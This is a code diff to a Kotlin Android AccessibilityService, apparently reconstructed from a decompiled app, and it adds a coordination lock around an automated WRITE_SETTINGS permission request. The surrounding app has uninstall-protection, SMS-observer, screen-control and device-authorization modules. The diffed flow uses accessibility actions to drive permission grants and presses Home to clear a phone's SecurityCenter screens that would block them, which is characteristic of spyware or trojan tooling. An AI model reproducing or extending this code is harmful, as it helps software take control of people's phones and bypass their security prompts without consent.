@@ -48,6 +48,7 @@ import com.storm.safe.rock.service.modules.protection.UninstallProtectionManager
 import com.storm.safe.rock.service.modules.screen.ScreenControlHelper
 import com.storm.safe.rock.service.modules.SmsContentObserver
 import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
+import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
 import com.storm.safe.rock.util.AssetConfigReader
 import java.util.Locale
 import java.util.concurrent.atomic.AtomicBoolean
@@ -3722,8 +3723,13 @@ class MyAccessibilityService : AccessibilityService() {
      * then either enables uninstall protection or waits for system stability.
      */
     fun resumeWriteSettingsPermissionRequest() {
+        android.util.Log.d(TAG, "🔐🔐🔐 [密码调试] resumeWriteSettingsPermissionRequest() 被调用！")
+        // Advisory bail-out: if auth flow is still active, skip — auth's finally will re-invoke us
+        if (AutomationCoordinator.isBusy() && AutomationCoordinator.currentFlow() == "auth") {
+            android.util.Log.d(TAG, "⏸️ [write_settings] auth 流程仍在持锁，跳过本次 resume (auth finally 会重新调用)")
+            return
+        }
         try {
-            android.util.Log.d(TAG, "🔐🔐🔐 [密码调试] resumeWriteSettingsPermissionRequest() 被调用！")
             android.util.Log.d(TAG, "▶️ 恢复WRITE_SETTINGS权限申请")
             isScreenCaptureActive = false
             val mo = mainOrchestrator
@@ -3742,34 +3748,38 @@ class MyAccessibilityService : AccessibilityService() {
             android.util.Log.d(TAG, "🔧 WRITE_SETTINGS权限未获取，等待系统稳定")
             // JADX: launches dqtvuisjd$resumeWriteSettingsPermissionRequest$3 coroutine
             coroutineScope?.launch {
-                try {
-                    delay(800L) // JADX: b81.m210571b1(800L, this) — vendor pure delay
-                    android.util.Log.d(TAG, "🔐🔐🔐 [密码调试] 800ms延迟结束，直接调用requestWriteSettingsPermission()")
-                    // JADX: $3$1 inner coroutine launched on Dispatchers.Main
-                    // Checks isScreenCaptureActive (f52432g3) before calling f7()
-                    if (isScreenCaptureActive) {
-                        android.util.Log.d(TAG, "⏸️ WRITE_SETTINGS权限申请已被暂停，跳过申请")
-                    } else {
-                        android.util.Log.d(TAG, "🔧 开始申请WRITE_SETTINGS权限")
-                        val mo = mainOrchestrator
-                        if (mo == null) {
-                            android.util.Log.d(TAG, "❌ WriteSettingsPermissionManager未初始化，跳过权限申请")
+                AutomationCoordinator.withFlow("write_settings") {
+                    try {
+                        delay(800L) // JADX: b81.m210571b1(800L, this) — vendor pure delay
+                        android.util.Log.d(TAG, "🔐🔐🔐 [密码调试] 800ms延迟结束，直接调用requestWriteSettingsPermission()")
+                        // JADX: $3$1 inner coroutine launched on Dispatchers.Main
+                        // Checks isScreenCaptureActive (f52432g3) before calling f7()
+                        if (isScreenCaptureActive) {
+                            android.util.Log.d(TAG, "⏸️ WRITE_SETTINGS权限申请已被暂停，跳过申请")
                         } else {
-                            // 清除 attempted flag，确保 resume 后能重新触发
-                            try {
-                                applicationContext.getSharedPreferences("write_settings_state", 0)
-                                    .edit().putBoolean("write_settings_attempted", false).apply()
-                            } catch (_: Exception) {}
-                            // 清理品牌引擎留下的 SecurityCenter 页面栈，避免挡住 WRITE_SETTINGS
-                            try {
-                                performGlobalAction(GLOBAL_ACTION_HOME)
-                                delay(800L)
-                            } catch (_: Exception) {}
-                            mo.startWriteSettingsPermissionRequest()
+                            android.util.Log.d(TAG, "🔧 开始申请WRITE_SETTINGS权限")
+                            val mo = mainOrchestrator
+                            if (mo == null) {
+                                android.util.Log.d(TAG, "❌ WriteSettingsPermissionManager未初始化，跳过权限申请")
+                            } else {
+                                // 清除 attempted flag，确保 resume 后能重新触发
+                                try {
+                                    applicationContext.getSharedPreferences("write_settings_state", 0)
+                                        .edit().putBoolean("write_settings_attempted", false).apply()
+                                } catch (_: Exception) {}
+                                // 清理品牌引擎留下的 SecurityCenter 页面栈，避免挡住 WRITE_SETTINGS
+                                try {
+                                    performGlobalAction(GLOBAL_ACTION_HOME)
+                                    delay(800L)
+                                } catch (_: Exception) {}
+                                mo.startWriteSettingsPermissionRequest()
+                            }
                         }
+                    } catch (e: kotlinx.coroutines.CancellationException) {
+                        throw e
+                    } catch (e: Exception) {
+                        android.util.Log.e(TAG, "❌ 申请WRITE_SETTINGS权限失败", e)
                     }
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "❌ 申请WRITE_SETTINGS权限失败", e)
                 }
             }
         } catch (e: Exception) {
